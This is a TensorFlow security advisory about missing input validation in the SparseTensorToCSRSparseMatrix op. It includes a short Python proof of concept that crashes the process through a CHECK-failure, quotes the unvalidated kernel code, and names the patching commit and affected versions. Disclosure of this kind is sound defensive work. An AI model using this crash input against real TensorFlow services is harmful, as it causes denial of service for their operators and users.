summary: "Missing validation causes denial of service via `SparseTensorToCSRSparseMatrix`\n\
  ### Impact\nThe implementation of [`tf.raw_ops.SparseTensorToCSRSparseMatrix`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/sparse/sparse_tensor_to_csr_sparse_matrix_op.cc#L65-L119)\
  \ does not fully validate the input arguments. This results in a `CHECK`-failure which can\
  \ be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\n\
  indices = tf.constant(53, shape=[3], dtype=tf.int64)\nvalues = tf.constant(0.554979503, shape=[218650],\
  \ dtype=tf.float32)\ndense_shape = tf.constant(53, shape=[3], dtype=tf.int64)\n    \ntf.raw_ops.SparseTensorToCSRSparseMatrix(\n\
  \  indices=indices,\n  values=values,\n  dense_shape=dense_shape)\n```\n\nThe code assumes\
  \ `dense_shape` is a vector and `indices` is a matrix (as part of requirements for sparse\
  \ tensors) but there is no validation for this:\n  \n```cc\n    const Tensor& indices = ctx->input(0);\n\
  \    const Tensor& values = ctx->input(1);\n    const Tensor& dense_shape = ctx->input(2);\n\
  \    const int rank = dense_shape.NumElements();\n    OP_REQUIRES(ctx, rank == 2 || rank ==\
  \ 3,\n                errors::InvalidArgument(\"SparseTensor must have rank 2 or 3; \",\n\
  \                                        \"but indices has rank: \", rank));\n    auto dense_shape_vec\
  \ = dense_shape.vec<int64_t>();\n    // ...\n    OP_REQUIRES_OK(\n        ctx,\n        coo_to_csr(batch_size,\
  \ num_rows, indices.template matrix<int64_t>(),\n                   batch_ptr.vec<int32>(),\
  \ csr_row_ptr.vec<int32>(),\n                   csr_col_ind.vec<int32>()));\n```\n\n### Patches\n\
  We have patched the issue in GitHub commit [ea50a40e84f6bff15a0912728e35b657548cef11](https://github.com/tensorflow/tensorflow/commit/ea50a40e84f6bff15a0912728e35b657548cef11).\n\
  \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow\
  \ 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported\
  \ range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md)\
  \ for more information regarding the security model and how to contact us with issues and\
  \ questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou\
  \ from Secure Systems Lab at Brown University."
